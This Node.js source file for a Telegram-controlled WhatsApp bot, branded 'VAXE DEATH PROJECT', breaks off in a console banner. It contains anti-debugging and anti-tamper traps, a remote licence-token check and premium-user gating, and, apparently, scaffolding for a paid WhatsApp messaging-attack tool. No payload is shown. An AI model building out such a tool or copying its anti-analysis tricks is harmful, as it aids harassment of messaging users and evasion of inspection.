const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = 'https://raw.githubusercontent.com/Ditzy99/BLAZE/refs/heads/main/token.json';
const thumbnailUrl = "https://files.catbox.moe/4c8cx6.jpg";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧

╰➤ INFORMATION:
 ▢ Developer: @DitzzNotDev
 ▢ Version: 𝟧.𝟣 𝘗𝘳𝘰 
 ▢ Status: Bot Connected
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧

╰➤ INFORMATION:
 ▢ Developer: @DitzzNotDev
 ▢ Version: 𝟧.𝟣 𝘗𝘳𝘰 
 ▢ Status: No Access
  
  Perubahan kode terdeteksi, Harap membeli script kepada reseller
  yang tersedia dan legal
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧

╰➤ INFORMATION:
 ▢ Developer: @DitzzNotDev
 ▢ Version: 𝟧.𝟣 𝘗𝘳𝘰 
 ▢ Status: No Access
  
  Perubahan kode terdeteksi, Harap membeli script kepada reseller
  yang tersedia dan legal
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧

╰➤ INFORMATION:
 ▢ Developer: @DitzzNotDev
 ▢ Version: 𝟧.𝟣 𝘗𝘳𝘰 
 ▢ Status: No Access
  
  Token tidak terdaftar, Mohon membeli akses kepada reseller yang tersedia
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧

╰➤ INFORMATION:
 ▢ Developer: @DitzzNotDev
 ▢ Version: 𝟧.𝟣 𝘗𝘳𝘰 
 ▢ Status: No Access
  
  Gagal menghubungkan ke server, Akses ditolak
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧

╰➤ INFORMATION:
 ▢ Developer: @DitzzNotDev
 ▢ Version: 𝟧.𝟣 𝘗𝘳𝘰 
 ▢ Status: Bot Connected
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Netrality',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `<blockquote>
#- 𝗛𝗢𝗩𝗘𝗟𝗬 - 𝗙𝗟𝗢𝗪𝗘𝗥

▢ Number: ${lastPairingMessage.phoneNumber}
▢ Pairing Code: ${lastPairingMessage.pairingCode}
▢ Type: Connected
</blockquote>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
